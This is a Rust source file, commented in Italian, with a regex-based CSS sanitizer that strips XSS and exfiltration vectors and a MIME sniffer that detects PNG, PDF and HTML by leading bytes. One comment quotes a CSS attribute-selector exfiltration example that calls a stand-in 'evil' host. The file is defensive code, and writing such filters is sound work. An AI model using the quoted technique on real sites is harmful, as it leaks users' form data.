use regex::Regex;

/// Sanitizzatore dedicato ai fogli di stile CSS (sia inline nei tag <style> che file esterni .css)
pub struct CssSanitizer;

impl CssSanitizer {
    /// Pulisce una stringa CSS rimuovendo vettori di attacco XSS e di esfiltrazione dati.
    pub fn sanitize(css_content: &str) -> String {
        let mut cleaned = css_content.to_string();

        // 1. Neutralizza IE expression()
        // Cerca la parola "expression" seguita da parentesi.
        // Vettore di attacco classico su vecchie versioni di Internet Explorer.
        let re_expression = Regex::new(r"(?i)expression\s*\(.*?\)").unwrap();
        cleaned = re_expression.replace_all(&cleaned, "/* expression rimossa */").to_string();

        // 2. Neutralizza url(javascript:...)
        // Impedisce l'esecuzione di script tramite la proprietà background o content.
        let re_js_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?javascript:.*?['\x22]?\s*\)").unwrap();
        cleaned = re_js_url.replace_all(&cleaned, "url('about:blank')").to_string();

        // 3. Neutralizza @import cross-origin o contenenti javascript
        // Blocca catene di @import esterne che potrebbero caricare stili malevoli a cascata
        // o eseguire javascript mascherato.
        let re_import = Regex::new(r"(?i)@import\s+(?:url\()?\s*['\x22]?(?:http:|https:|javascript:)[^;]+;").unwrap();
        cleaned = re_import.replace_all(&cleaned, "/* @import esterno bloccato */\n").to_string();

        // 4. Previene l'esfiltrazione dati (Data Leakage) tramite background: url(...)
        // Nel tuo scenario, l'attaccante usa input[value^='a'] { background: url('http://evil.../?v=a') }
        // per rubare dati form o cookie riga per riga. Blocchiamo gli URL HTTP/HTTPS esterni nei CSS.
        let re_external_url = Regex::new(r"(?i)url\s*\(\s*['\x22]?(?:http:|https:)[^)]*\)").unwrap();
        cleaned = re_external_url.replace_all(&cleaned, "url('about:blank')").to_string();

        cleaned
    }
}

#[derive(Debug, PartialEq)]
pub enum DetectedType {
    Html,
    Png,
    Pdf,
    Unknown,
}

pub struct MimeSniffer;

impl MimeSniffer {
    /// Analizza i byte grezzi del contenuto per determinarne la vera natura,
    /// ignorando le dichiarazioni del server o le estensioni del file.
    pub fn sniff(raw_data: &[u8]) -> DetectedType {
        // 1. Controllo Magic Bytes del PNG
        // VERO file binario (se i byte sono puri)
        let png_magic: [u8; 8] = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];

        // PNG letto come Stringa UTF-8 (il byte 0x89 non valido diventa '')
        let png_magic_utf8 = "\u{FFFD}PNG".as_bytes();

        if raw_data.starts_with(&png_magic) || raw_data.starts_with(png_magic_utf8) {
            return DetectedType::Png;
        }

        // 2. Controllo Magic Bytes del PDF
        // I PDF iniziano tipicamente con "%PDF-"
        if raw_data.starts_with(b"%PDF-") {
            return DetectedType::Pdf;
        }

        // 3. Controllo per l'HTML (Sniffing euristico)
        // L'HTML è testuale, quindi spesso inizia con spazi bianchi innocui. Li saltiamo.
        let mut start_idx = 0;
        while start_idx < raw_data.len() && matches!(raw_data[start_idx], 0x09 | 0x0A | 0x0C | 0x0D | 0x20) {
            start_idx += 1;
        }

        let text_data = &raw_data[start_idx..];

        // Estraiamo i primi 15 byte per cercare tag HTML comuni (ignorando maiuscole/minuscole)
        let snippet_len = std::cmp::min(text_data.len(), 15);
        if let Ok(snippet) = std::str::from_utf8(&text_data[..snippet_len]) {
            let upper_snippet = snippet.to_ascii_uppercase();
            // Se troviamo un tag tipico di apertura, è HTML
            if upper_snippet.starts_with("<!DOCTYPE") ||
                upper_snippet.starts_with("<HTML") ||
                upper_snippet.starts_with("<HEAD") ||
                upper_snippet.starts_with("<BODY") ||
                upper_snippet.starts_with("<SCRIPT") ||
                upper_snippet.starts_with("<H1") // Usato spesso nei test
            {
                return DetectedType::Html;
            }
        }

        // Se non corrisponde a nulla di noto, lo classifichiamo come sconosciuto
        DetectedType::Unknown
    }
}
